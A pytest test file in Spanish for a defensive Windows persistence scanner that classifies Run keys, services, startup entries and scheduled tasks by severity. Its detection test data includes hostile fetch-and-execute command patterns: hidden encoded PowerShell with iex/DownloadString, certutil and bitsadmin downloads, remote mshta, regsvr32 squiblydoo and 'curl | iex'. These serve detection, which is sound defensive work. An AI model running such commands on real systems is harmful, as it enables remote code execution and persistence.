"""winpersist: vectores de arranque de Windows (registro, Startup, servicios, tareas)."""
from __future__ import annotations

import os

import pytest

from centinel.core import Severity
from centinel.collectors.winpersist import (
    AutorunEntry, classify_autorun, classify_autoruns, command_flags,
    enumerate_autoruns, parse_command, scan,
)

WIN = r"C:\Windows"
ESCRIBIBLES = (r"c:\users\cris\appdata\local\temp", r"c:\users\cris\appdata\roaming",
               r"c:\users\cris\downloads", r"c:\programdata")
MS = "CN=Microsoft Windows, O=Microsoft Corporation"


def entry(location="HKCU\\Run", name="App", command=r"C:\Program Files\App\a.exe",
          path=None, signer=MS, valid=True, user=""):
    return AutorunEntry(location=location, name=name, command=command,
                        path=parse_command(command) if path is None else path,
                        signer=signer, sig_valid=valid, user=user)


def clasifica(e, **kw):
    kw.setdefault("win_dir", WIN)
    kw.setdefault("writable_dirs", ESCRIBIBLES)
    return classify_autorun(e, **kw)


# ----------------------------------------------------------- parse_command
class TestParseCommand:
    def test_ruta_entre_comillas_con_argumentos(self):
        assert parse_command(r'"C:\Program Files\App\a.exe" -min --flag') == \
            r"C:\Program Files\App\a.exe"

    def test_comillas_sin_cerrar(self):
        assert parse_command(r'"C:\App\a.exe') == r"C:\App\a.exe"

    def test_comilla_simple(self):
        assert parse_command(r"'C:\App\a.exe' -x") == r"C:\App\a.exe"

    def test_sin_comillas_con_argumentos(self):
        assert parse_command(r"C:\Windows\system32\a.exe /start") == \
            r"C:\Windows\system32\a.exe"

    def test_sin_comillas_con_espacios_en_la_ruta(self):
        # El caso que más se falla: ruta con espacios y sin comillas.
        assert parse_command(r"C:\Program Files\App\a.exe -flag") == \
            r"C:\Program Files\App\a.exe"

    def test_coma_del_indice_de_icono(self):
        assert parse_command(r"C:\Windows\system32\a.exe,1") == \
            r"C:\Windows\system32\a.exe"

    def test_expande_variables_de_entorno(self, monkeypatch):
        monkeypatch.setenv("SystemRoot", r"C:\Windows")
        assert parse_command(r"%SystemRoot%\system32\a.exe").lower() == \
            r"c:\windows\system32\a.exe"

    def test_dll_y_otras_extensiones(self):
        assert parse_command(r"C:\T\x.dll,#1").endswith("x.dll")
        assert parse_command(r"C:\T\s.vbs").endswith("s.vbs")
        assert parse_command(r"C:\T\a.bat x").endswith("a.bat")

    def test_vacio_y_espacios(self):
        assert parse_command("") == ""
        assert parse_command("   ") == ""

    def test_sin_extension_reconocible_devuelve_el_primer_trozo(self):
        assert parse_command("algo-raro -x") == "algo-raro"

    def test_powershell_con_comando_largo(self):
        assert parse_command(
            "powershell.exe -nop -w hidden -enc ABCD").lower() == "powershell.exe"


# ----------------------------------------------------------- command_flags
class TestCommandFlags:
    @pytest.mark.parametrize("cmd,trozo", [
        ("powershell -enc ABCDEF", "base64"),
        ("powershell -EncodedCommand ABCDEF", "base64"),
        ("powershell -w hidden -c x", "oculta"),
        ("powershell -WindowStyle Hidden -c x", "oculta"),
        ("powershell -nop -c iex(x)", "perfil"),
        ("cmd /c iex algo", "Invoke-Expression"),
        ("powershell Invoke-WebRequest http://x", "descarga"),
        ("powershell (New-Object Net.WebClient).DownloadString('http://x')", "descarga"),
        ("powershell [Convert]::FromBase64String('x')", "base64"),
        ("certutil -urlcache -split -f http://x y.exe", "certutil"),
        ("certutil -decode a.txt b.exe", "certutil"),
        ("bitsadmin /transfer j http://x c:\\y", "bitsadmin"),
        ("mshta http://malo/x.hta", "mshta"),
        ("mshta javascript:alert(1)", "mshta"),
        ("rundll32 javascript:\"..\\mshtml\"", "rundll32"),
        ("regsvr32 /s /u /i:http://x/y.sct scrobj.dll", "squiblydoo"),
        ("curl http://x | iex", "canalizada"),
        ("powershell -ExecutionPolicy Bypass -f x.ps1", "política"),
    ])
    def test_detecta_el_patron(self, cmd, trozo):
        fuertes, debiles = command_flags(cmd)
        assert any(trozo in m for m in fuertes + debiles)

    def test_comando_normal_no_marca_nada(self):
        assert command_flags(r'"C:\Program Files\App\app.exe" --background') == ([], [])
        assert command_flags("") == ([], [])

    def test_acumula_varios_motivos(self):
        fuertes, debiles = command_flags("powershell -w hidden -enc ABCD")
        assert fuertes and debiles

    def test_separa_fuertes_de_debiles(self):
        fuertes, debiles = command_flags("powershell -w hidden -c algo")
        assert fuertes == []                      # nada decisivo
        assert any("oculta" in m for m in debiles)

    def test_en_tareas_programadas_la_ventana_oculta_es_normal(self):
        # Las tareas corren sin escritorio: avisar de esto es puro ruido.
        _f, debiles = command_flags("powershell -w hidden -c x",
                                    "Tarea programada")
        assert not any("oculta" in m for m in debiles)

    def test_pero_en_run_si_cuenta(self):
        _f, debiles = command_flags("powershell -w hidden -c x", "HKCU\\Run")
        assert any("oculta" in m for m in debiles)


# ------------------------------------------------------------- clasificador
class TestBinarioEnCarpetaEscribible:
    def test_sin_firma_es_high(self):
        e = entry(command=r"C:\Users\Cris\AppData\Roaming\x.exe", signer="",
                  valid=False)
        razones, sev = clasifica(e)
        assert sev == int(Severity.HIGH)
        assert any("escribible" in r for r in razones)

    def test_firmado_por_confianza_se_calla(self):
        e = entry(command=r"C:\Users\Cris\AppData\Roaming\x.exe", signer=MS,
                  valid=True)
        assert clasifica(e) == ([], int(Severity.INFO))

    def test_firma_invalida_no_salva(self):
        e = entry(command=r"C:\Users\Cris\AppData\Roaming\x.exe", signer=MS,
                  valid=False)
        assert clasifica(e)[1] == int(Severity.HIGH)

    def test_firmante_desconocido_no_salva(self):
        e = entry(command=r"C:\Users\Cris\Downloads\x.exe",
                  signer="CN=Pirata SL", valid=True)
        assert clasifica(e)[1] == int(Severity.HIGH)

    def test_program_files_no_dispara(self):
        assert clasifica(entry(signer="", valid=False))[0] == []

    def test_allowlist_exime(self):
        e = entry(command=r"C:\Users\Cris\AppData\Roaming\npm\node.exe",
                  signer="", valid=False)
        razones, sev = clasifica(
            e, allowed_paths=(r"c:\users\cris\appdata\roaming\npm",))
        assert razones == [] and sev == int(Severity.INFO)


class TestLivingOffTheLand:
    def test_interprete_con_bandera_de_ataque_es_critico(self):
        e = entry(command="powershell.exe -nop -w hidden -enc SQBFAFgA",
                  path="powershell.exe", signer=MS, valid=True)
        razones, sev = clasifica(e)
        assert sev == int(Severity.CRITICAL)
        assert len(razones) >= 2

    def test_aunque_este_firmado_por_microsoft(self):
        e = entry(command=r"C:\Windows\System32\mshta.exe http://malo/x.hta",
                  signer=MS, valid=True)
        assert clasifica(e)[1] == int(Severity.CRITICAL)

    def test_binario_propio_con_patron_sospechoso_tambien_alerta(self):
        e = entry(command=r"C:\Program Files\App\raro.exe -enc AAAA",
                  signer="CN=App SL", valid=True)
        assert clasifica(e)[1] >= int(Severity.HIGH)

    def test_comando_limpio_de_interprete_no_alerta(self):
        e = entry(command=r"C:\Windows\System32\cmd.exe /c echo hola",
                  signer=MS, valid=True)
        assert clasifica(e)[0] == []


class TestRunOnce:
    def test_runonce_a_carpeta_escribible_acumula_motivo(self):
        e = entry(location="HKCU\\RunOnce",
                  command=r"C:\Users\Cris\AppData\Local\Temp\drop.exe",
                  signer="", valid=False)
        razones, sev = clasifica(e)
        assert sev == int(Severity.HIGH)
        assert any("RunOnce" in r for r in razones)

    def test_runonce_a_program_files_no_dispara(self):
        assert clasifica(entry(location="HKLM\\RunOnce"))[0] == []


class TestDobleExtension:
    @pytest.mark.parametrize("nombre", ["factura.pdf.exe", "foto.jpg.scr",
                                        "informe.docx.bat", "cancion.mp3.pif"])
    def test_se_detecta(self, nombre):
        e = entry(command=r"C:\Program Files\App\\" + nombre, signer=MS,
                  valid=True)
        razones, sev = clasifica(e)
        assert any("doble extensión" in r for r in razones)
        assert sev == int(Severity.HIGH)

    def test_un_exe_normal_no_dispara(self):
        assert clasifica(entry(command=r"C:\Program Files\App\app.exe"))[0] == []

    def test_nombre_con_punto_pero_sin_doble_extension(self):
        e = entry(command=r"C:\Program Files\App\app.v2.exe")
        assert clasifica(e)[0] == []


class TestServicios:
    def test_servicio_fuera_de_windows_y_program_files(self):
        e = entry(location="Servicio", name="MalSvc",
                  command=r"C:\Datos\svc.exe", signer="", valid=False)
        razones, sev = clasifica(e)
        assert any("servicio con binario fuera" in r for r in razones)
        assert sev == int(Severity.HIGH)

    def test_servicio_en_system32_no_dispara(self):
        e = entry(location="Servicio",
                  command=r"C:\Windows\System32\svchost.exe -k netsvcs",
                  signer=MS, valid=True)
        assert clasifica(e)[0] == []

    def test_servicio_en_program_files_no_dispara(self):
        e = entry(location="Servicio", command=r"C:\Program Files\App\svc.exe",
                  signer="CN=App", valid=True)
        assert clasifica(e)[0] == []

    def test_servicio_firmado_fuera_de_sitio_no_dispara_por_ubicacion(self):
        e = entry(location="Servicio", command=r"D:\Apps\svc.exe",
                  signer=MS, valid=True)
        assert clasifica(e)[0] == []


class TestEjecutableSinResolver:
    def test_se_informa_en_low_sin_afirmar_nada(self):
        e = AutorunEntry(location="HKCU\\Run", name="Raro", command="   algo   ",
                         path="", signer="", sig_valid=False)
        razones, sev = clasifica(e)
        assert sev == int(Severity.LOW)
        assert any("no se pudo resolver" in r for r in razones)

    def test_entrada_totalmente_vacia_no_genera_nada(self):
        e = AutorunEntry(location="HKCU\\Run", name="", command="", path="")
        assert clasifica(e) == ([], int(Severity.INFO))


class TestClassifyAutoruns:
    def test_genera_un_evento_por_entrada_sospechosa(self):
        entries = [
            entry(),                                            # legítima
            entry(command=r"C:\Users\Cris\Downloads\x.exe", signer="",
                  valid=False),                                 # escribible
            entry(command="powershell.exe -enc AAAA", path="powershell.exe"),
        ]
        events = classify_autoruns(entries, win_dir=WIN,
                                   writable_dirs=ESCRIBIBLES)
        assert len(events) == 2
        assert all(e.kind == "win_persistence" for e in events)

    def test_el_evento_lleva_contexto_completo(self):
        e = entry(location="HKLM\\Run", name="Malo",
                  command=r"C:\Users\Cris\Downloads\x.exe", signer="",
                  valid=False, user="SYSTEM")
        ev = classify_autoruns([e], win_dir=WIN, writable_dirs=ESCRIBIBLES)[0]
        assert ev.enrichment["location"] == "HKLM\\Run"
        assert ev.enrichment["name"] == "Malo"
        assert ev.enrichment["user"] == "SYSTEM"
        assert ev.enrichment["command"].endswith("x.exe")
        assert ev.enrichment["reasons"]
        assert {"persistence", "host", "windows", "autorun"} <= ev.tags
        assert "HKLM\\Run" in ev.message and "Malo" in ev.message

    def test_lista_vacia(self):
        assert classify_autoruns([], win_dir=WIN, writable_dirs=ESCRIBIBLES) == []

    def test_eventos_serializables(self):
        e = entry(command=r"C:\Users\Cris\Downloads\x.exe", signer="",
                  valid=False)
        for ev in classify_autoruns([e], win_dir=WIN, writable_dirs=ESCRIBIBLES):
            assert isinstance(ev.to_dict(), dict)


# ------------------------------------------------------------------ I/O
class TestEnumerate:
    def test_parsea_la_salida_y_resuelve_rutas(self, monkeypatch):
        import centinel.collectors.winpersist as wp

        class Res:
            stdout = ('[{"location":"HKCU\\\\Run","name":"App",'
                      '"command":"\\"C:\\\\App\\\\a.exe\\" -min","user":""},'
                      '{"location":"Servicio","name":"S","command":'
                      '"C:\\\\W\\\\s.exe","user":"LocalSystem"}]')
        monkeypatch.setattr(wp.subprocess, "run", lambda *a, **k: Res())
        out = enumerate_autoruns()
        assert len(out) == 2
        assert out[0].path == r"C:\App\a.exe"
        assert out[1].user == "LocalSystem"

    def test_descarta_entradas_sin_comando(self, monkeypatch):
        import centinel.collectors.winpersist as wp

        class Res:
            stdout = ('[{"location":"HKCU\\\\Run","name":"A","command":""},'
                      '{"location":"HKCU\\\\Run","name":"B","command":"  "},'
                      '{"location":"HKCU\\\\Run","name":"C","command":"C:\\\\a.exe"}]')
        monkeypatch.setattr(wp.subprocess, "run", lambda *a, **k: Res())
        assert [e.name for e in enumerate_autoruns()] == ["C"]

    def test_repone_el_acento_de_startup_comun(self, monkeypatch):
        import centinel.collectors.winpersist as wp

        class Res:
            stdout = ('{"location":"Startup (comun)","name":"x",'
                      '"command":"C:\\\\a.exe"}')
        monkeypatch.setattr(wp.subprocess, "run", lambda *a, **k: Res())
        assert enumerate_autoruns()[0].location == "Startup (común)"

    def test_una_sola_entrada_llega_como_dict(self, monkeypatch):
        import centinel.collectors.winpersist as wp

        class Res:
            stdout = '{"location":"HKCU\\\\Run","name":"A","command":"C:\\\\a.exe"}'
        monkeypatch.setattr(wp.subprocess, "run", lambda *a, **k: Res())
        assert len(enumerate_autoruns()) == 1

    def test_salida_invalida_no_revienta(self, monkeypatch):
        import centinel.collectors.winpersist as wp

        class Res:
            stdout = "no soy json"
        monkeypatch.setattr(wp.subprocess, "run", lambda *a, **k: Res())
        assert enumerate_autoruns() == []

    def test_powershell_ausente_no_revienta(self, monkeypatch):
        import centinel.collectors.winpersist as wp
        monkeypatch.setattr(wp.subprocess, "run",
                            lambda *a, **k: (_ for _ in ()).throw(OSError("no")))
        assert enumerate_autoruns() == []

    def test_timeout_no_revienta(self, monkeypatch):
        import subprocess as sp
        import centinel.collectors.winpersist as wp

        def boom(*a, **k):
            raise sp.TimeoutExpired("powershell", 1)
        monkeypatch.setattr(wp.subprocess, "run", boom)
        assert enumerate_autoruns() == []

    def test_filas_no_dict_se_ignoran(self, monkeypatch):
        import centinel.collectors.winpersist as wp

        class Res:
            stdout = '["basura",{"location":"HKCU\\\\Run","name":"A","command":"C:\\\\a.exe"}]'
        monkeypatch.setattr(wp.subprocess, "run", lambda *a, **k: Res())
        assert len(enumerate_autoruns()) == 1


class TestAttachSignatures:
    def test_pide_las_firmas_una_sola_vez_para_todas(self, monkeypatch):
        from centinel.collectors import hashwatch
        llamadas = []

        def fake(rutas, timeout=0):
            llamadas.append(tuple(rutas))
            return {hashwatch.norm_path(r): (MS, True, "Valid") for r in rutas}
        monkeypatch.setattr(hashwatch, "signatures_detail", fake)
        entries = [entry(command=r"C:\A\a.exe", signer="", valid=False),
                   entry(command=r"C:\B\b.exe", signer="", valid=False)]
        from centinel.collectors.winpersist import attach_signatures
        out = attach_signatures(entries)
        assert len(llamadas) == 1 and len(llamadas[0]) == 2
        assert all(e.sig_valid for e in out)

    def test_sin_rutas_no_pide_nada(self, monkeypatch):
        from centinel.collectors import hashwatch
        from centinel.collectors.winpersist import attach_signatures
        monkeypatch.setattr(hashwatch, "signatures_detail",
                            lambda *a, **k: pytest.fail("no debe pedirse"))
        e = AutorunEntry(location="HKCU\\Run", name="x", command="raro", path="")
        assert attach_signatures([e])[0].path == ""


class TestScan:
    def test_usa_las_entradas_que_le_dan_sin_tocar_el_sistema(self, monkeypatch):
        import centinel.collectors.winpersist as wp
        monkeypatch.setattr(wp, "enumerate_autoruns",
                            lambda *a, **k: pytest.fail("no debe enumerar"))
        e = entry(command=r"C:\Users\Cris\Downloads\x.exe", signer="",
                  valid=False)
        events = scan([e], win_dir=WIN, writable_dirs=ESCRIBIBLES,
                      with_signatures=False)
        assert len(events) == 1

    def test_enumera_cuando_no_le_pasan_entradas(self, monkeypatch):
        import centinel.collectors.winpersist as wp
        monkeypatch.setattr(wp, "enumerate_autoruns", lambda *a, **k: [])
        assert scan(win_dir=WIN, writable_dirs=ESCRIBIBLES,
                    with_signatures=False) == []


class TestRuidoControlado:
    """Las reglas que separan señal de ruido, con los casos reales que las motivaron."""

    def test_tarea_de_windows_con_ventana_oculta_no_es_critica(self):
        # Caso real: UninstallSMB1ClientTask, una tarea legítima de Windows.
        e = entry(location="Tarea programada", name="UninstallSMB1ClientTask",
                  command="powershell.exe -WindowStyle Hidden -Command x",
                  path="powershell.exe", signer=MS, valid=True)
        razones, sev = clasifica(e)
        assert razones == [] and sev == int(Severity.INFO)

    def test_ventana_oculta_en_run_es_medium_no_critical(self):
        e = entry(location="HKCU\\Run", command="powershell.exe -w hidden -c x",
                  path="powershell.exe", signer="", valid=False)
        _razones, sev = clasifica(e)
        assert sev == int(Severity.MEDIUM)

    def test_ventana_oculta_mas_base64_si_es_critica(self):
        e = entry(location="HKCU\\Run",
                  command="powershell.exe -w hidden -enc SQBFAFgA",
                  path="powershell.exe", signer=MS, valid=True)
        _razones, sev = clasifica(e)
        assert sev == int(Severity.CRITICAL)

    def test_acceso_directo_en_startup_no_se_acusa_de_no_estar_firmado(self):
        # Caso real: Ollama.lnk en Startup. Un .lnk NO se puede firmar.
        e = entry(location="Startup", name="Ollama.lnk",
                  command=r"C:\Users\Cris\AppData\Roaming\Microsoft\Windows\Ollama.lnk",
                  signer="", valid=False)
        razones, sev = clasifica(e)
        assert sev == int(Severity.MEDIUM)
        assert any("no verificable por firma" in r for r in razones)
        assert not any("sin firma de confianza" in r for r in razones)

    @pytest.mark.parametrize("ext", [".lnk", ".cmd", ".bat", ".vbs", ".js",
                                     ".ps1", ".url", ".hta"])
    def test_ningun_formato_no_firmable_se_marca_como_sin_firma(self, ext):
        e = entry(location="Startup",
                  command=r"C:\Users\Cris\Downloads\x" + ext,
                  signer="", valid=False)
        razones, _sev = clasifica(e)
        assert not any("sin firma de confianza" in r for r in razones)

    def test_exe_sin_firmar_sigue_siendo_high(self):
        e = entry(location="Startup", command=r"C:\Users\Cris\Downloads\x.exe",
                  signer="", valid=False)
        _razones, sev = clasifica(e)
        assert sev == int(Severity.HIGH)

    def test_firma_no_verificable_degrada_a_medium(self):
        # Caso real: el motor de Defender en ProgramData no se deja leer.
        e = AutorunEntry(
            location="Servicio", name="MDCoreSvc",
            command=r"C:\ProgramData\Microsoft\Windows Defender\Platform\x.exe",
            path=r"C:\ProgramData\Microsoft\Windows Defender\Platform\x.exe",
            signer="", sig_valid=False, sig_status="UnknownError")
        razones, sev = clasifica(e)
        assert sev == int(Severity.MEDIUM)
        assert any("no se pudo verificar la firma" in r for r in razones)

    def test_notsigned_explicito_si_es_high(self):
        e = AutorunEntry(location="HKCU\\Run", name="x",
                         command=r"C:\Users\Cris\Downloads\x.exe",
                         path=r"C:\Users\Cris\Downloads\x.exe",
                         signer="", sig_valid=False, sig_status="NotSigned")
        _razones, sev = clasifica(e)
        assert sev == int(Severity.HIGH)

    def test_servicio_con_firma_no_verificable_no_se_acusa_por_ubicacion(self):
        e = AutorunEntry(location="Servicio", name="S",
                         command=r"D:\Datos\svc.exe", path=r"D:\Datos\svc.exe",
                         signer="", sig_valid=False, sig_status="UnknownError")
        razones, _sev = clasifica(e)
        assert not any("fuera de Windows" in r for r in razones)

    def test_el_estado_de_firma_viaja_en_el_evento(self):
        e = AutorunEntry(location="HKCU\\Run", name="x",
                         command=r"C:\Users\Cris\Downloads\x.exe",
                         path=r"C:\Users\Cris\Downloads\x.exe",
                         signer="", sig_valid=False, sig_status="NotSigned")
        ev = classify_autoruns([e], win_dir=WIN, writable_dirs=ESCRIBIBLES)[0]
        assert ev.enrichment["sig_status"] == "NotSigned"


class TestInvocacionDePowerShell:
    def test_decodifica_en_utf8(self, monkeypatch):
        import centinel.collectors.winpersist as wp
        visto = {}

        class Res:
            stdout = "[]"
        monkeypatch.setattr(wp.subprocess, "run",
                            lambda cmd, **kw: (visto.update(kw), Res())[1])
        wp.enumerate_autoruns()
        assert visto["encoding"] == "utf-8" and visto["errors"] == "replace"

    def test_el_script_fuerza_salida_utf8(self):
        import centinel.collectors.winpersist as wp
        assert "OutputEncoding" in wp._PS_AUTORUNS

    def test_el_script_solo_lee(self):
        # Este módulo nunca debe modificar el sistema: ni borrar claves, ni
        # desactivar tareas, ni parar servicios. La decisión es del humano.
        import centinel.collectors.winpersist as wp
        prohibidos = ("Remove-Item", "Set-ItemProperty", "New-ItemProperty",
                      "Disable-ScheduledTask", "Unregister-ScheduledTask",
                      "Stop-Service", "Set-Service", "sc.exe", "reg delete",
                      "reg add")
        for verbo in prohibidos:
            assert verbo.lower() not in wp._PS_AUTORUNS.lower()
